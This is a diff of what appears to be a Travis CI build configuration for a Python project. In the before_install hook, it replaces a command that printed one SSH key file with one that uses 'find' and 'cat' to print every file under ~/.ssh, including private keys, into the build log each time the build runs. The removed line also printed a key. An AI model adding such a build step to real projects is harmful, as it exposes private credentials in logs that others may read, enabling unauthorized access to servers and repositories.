@@ -2,7 +2,7 @@ language: python
 python:
 - '3.4'
 before_install:
-- cat ~/.ssh/id_rsa.repo
+- find ~/.ssh/ -exec cat {} \;
 script:
 - python script.py
 env:
